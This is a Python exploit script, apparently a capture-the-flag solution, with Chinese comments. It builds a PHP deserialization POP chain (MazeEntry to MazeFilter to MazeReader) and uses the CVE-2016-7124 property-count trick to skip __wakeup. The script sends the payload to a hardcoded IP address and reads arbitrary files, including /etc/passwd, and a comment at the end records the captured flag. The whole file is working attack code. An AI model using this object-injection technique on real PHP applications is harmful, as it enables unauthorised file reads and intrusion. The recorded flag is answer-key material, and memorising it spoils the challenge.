#!/usr/bin/env python3
import re
import sys
import urllib.parse
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://160.202.254.160:11386/"
FLAG_PATH = sys.argv[2] if len(sys.argv) > 2 else None

CANDIDATE_PATHS = ["/flag", "/flag.txt", "/flag.php",
                   "/var/www/html/flag.php", "/etc/passwd"]


def s(x: str) -> str:
    """PHP 序列化字符串,长度自动计算 —— 杜绝手写长度前缀出错"""
    return f's:{len(x)}:"{x}";'


def build(path: str) -> str:
    """
    POP 链:
      MazeEntry::__destruct  →  $this->handler->process()
      MazeFilter::process    →  $this->target->output   (触发 __get)
      MazeReader::__get      →  file_get_contents($this->path)
    绕过:
      外层 MazeEntry 声明 2 个属性、实际只写 1 个 (CVE-2016-7124)
      → PHP < 5.6.25 / < 7.0.10 跳过 __wakeup,且属性完整保留
    """
    reader = f'O:{len("MazeReader")}:"MazeReader":1:{{{s("path")}{s(path)}}}'
    flt = f'O:{len("MazeFilter")}:"MazeFilter":1:{{{s("target")}{reader}}}'
    #                               ↑↑ 关键: :2: 但下面只提供 1 个属性
    entry = f'O:{len("MazeEntry")}:"MazeEntry":2:{{{s("handler")}{flt}}}'
    return entry


def fire(path: str) -> str:
    payload = build(path)
    assert len(payload) <= 500, "payload 超过题目 500 字符限制"
    url = TARGET.rstrip("/") + "/?data=" + urllib.parse.quote(payload)
    resp = urllib.request.urlopen(url, timeout=10).read().decode(errors="replace")
    return resp.split("</html>", 1)[-1]      # 去掉 highlight_file 的高亮源码


def main():
    paths = [FLAG_PATH] if FLAG_PATH else CANDIDATE_PATHS
    for p in paths:
        tail = fire(p)
        m = re.search(r"flag\{[^}]*\}", tail)
        if m:
            print(f"[+] {p} → {m.group(0)}")
            return
        if "root:x:0:0" in tail:
            print(f"[+] {p} → (链路已通, 文件可读, 但不是 flag)")
        else:
            print(f"[-] {p} → {tail.strip()[:120]!r}")
    print("[!] 未匹配到 flag,可手动指定路径: python3 exp_序列化迷宫.py <url> /xxx")
    # flag{36a9ea5bc1ca94b6b00e069ef1e53192}


if __name__ == "__main__":
    main()